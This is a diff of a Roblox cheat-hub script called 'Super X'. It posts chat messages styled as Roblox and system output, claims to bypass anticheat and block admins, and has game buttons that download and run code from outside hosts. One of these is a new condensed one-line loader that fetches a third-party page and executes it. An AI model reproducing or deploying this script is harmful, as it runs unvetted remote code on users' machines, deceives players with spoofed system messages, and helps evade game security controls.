@@ -1,5 +1,5 @@
 game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{ --Getting "StarterGui" and calling the function
-Text = "{Roblox} Your script failed to execute, console lines 3 & 6 needed! ";
+Text = "{Roblox} Executed script require but your line in 4 & 2! ";
 Color = Color3.new(161,161,161);
 FontSize = Enum.FontSize.Size24;
 print("Failed to execute but line is worth 3 / 6 or try required.")
@@ -7,7 +7,7 @@ print("Failed to execute but line is worth 3 / 6 or try required.")
 wait(4.0)
 game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{ --Getting "StarterGui" and calling the function
 
-Text = "{System} Failed to load >require(2007744).llcteam(59909) forgot to addcmd 2?";
+Text = "{System} Failed to load >require(899081).superx(163209)";
 
 Color = Color3.new(161,161,161);
 
@@ -17,7 +17,7 @@ FontSize = Enum.FontSize.Size24;
 wait(5.0)
 game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{ --Getting "StarterGui" and calling the function
 
-Text = "[Super X]: Anticheat models has bypassed, now anything on Super X will working.";
+Text = "[Super X]: Anticheat clients has bypassed, now anything on Super X will working.";
 
 Color = Color3.new(161,161,161);
 
@@ -31,7 +31,7 @@ local Library = loadstring(game:HttpGet("https://www.soggy-ware.cf/Libs/PromptGu
 Library:New({
       Title = "Welcome to Super X",
     Footer = "Now dear friends, we gived it free enjoy it!",
-    Text = "Private Version v3.2",
+    Text = "Private Version v3.3",
     Icon = "http://www.roblox.com/thumbs/asset.ashx?assetid=10010679532&x=100&y=100&format=png",
     Yes = function()
             print("User Supporting!")
@@ -44,7 +44,7 @@ wait(8.0)
 
 game:GetService("StarterGui"):SetCore("SendNotification",{
      Title = "Super X";
-     Text = "Please wait...";
+     Text = "Welcome back!";
 })
 
 wait(6.0)
@@ -56,13 +56,13 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 
      Title = "Super X";
 
-     Text = "Autoexec failed, try active on Super X!"
+     Text = "Blocked admins line 1..."
 
 })
 wait(6.0)
 game:GetService("StarterGui"):SetCore("SendNotification",{
      Title = "Super X";
-     Text = "Presenting...";
+     Text = "Succes blocked.";
 })
 wait(6.0)
 
@@ -80,7 +80,7 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 wait(6.0)
 game:GetService("StarterGui"):SetCore("SendNotification",{
      Title = "Super X";
-     Text = "Succes! V3.2";
+     Text = "Succes! V3.3";
 })
 wait(1.0)
 
@@ -232,14 +232,15 @@ end)
 local zz = win:Tab("Game", "http://www.roblox.com/asset/?id=6022668888")
 
 zz:Label("Game")
-zz:Button("Murder Mystery 2!", "Best Maybe work because not our own script.", function()
-
+zz:Button("Murder Mystery 2!", "Maybe work because not our own script.", function()
 Flux:Notification("Do you want execute? here are key: lunarhubnicebye", "Okay!")
-
 wait(5.0)
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/vwSaraa/LunarHub/main/mm2"))()
-
+end)
+zz:Button("Murder Mystery 2+", "Maybe work because not our own script.", function()
+Flux:Notification("Do you want execute? here are key: lunarhubnicebye", "Okay!")
+wait(5.0)
+local a,b,c,d=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,"https://itsjidy.github.io/SymphonyHub/Loader.html"c(a and b, "Your Executor does not support.")a(b({Url=d,Method="GET"}).Body)()
 end)
 zz:Button("Murder Mystery 2", "Maybe work because not our own script.", function()
 Flux:Notification("Do you want execute?", "Okay!")
@@ -1139,6 +1140,7 @@ dd:Label("Update List")
 dd:Line()
 
 dd:Label("UPD: Bedwars script, Feature")
-
+dd:Label("UPD: Lines 2 Console")
+dd:Label("UPD: New Systems Bypasser v2")
 dd:Label("UPD: Bypasser Console")
 dd:Label("FIX: MM2 Scripts")
